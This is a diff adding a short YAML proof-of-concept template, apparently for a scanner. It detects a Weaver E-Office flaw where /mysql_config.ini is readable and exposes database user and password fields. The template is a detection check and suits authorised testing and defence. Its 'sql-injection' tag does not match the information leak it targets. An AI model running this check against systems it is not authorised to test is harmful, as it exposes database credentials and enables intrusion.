@@ -1,0 +1,14 @@
+id: poc-yaml-weaver-e-office-mysql-config-ini-information-leak
+info:
+  name: 泛微 E-Office mysql_config.ini 信息泄露漏洞
+  severity: medium
+  tags:
+  - sql-injection
+  finger: e-cology
+requests:
+- method: GET
+  path: /mysql_config.ini
+  expression: status_code == 200 && contains(body,"dataurl = \"localhost\"") && contains(body,"datauser")
+    && contains(body,"datapassword") && contains(body,"dataname = \"eoffice\"")
+variables: {}
+transport: http
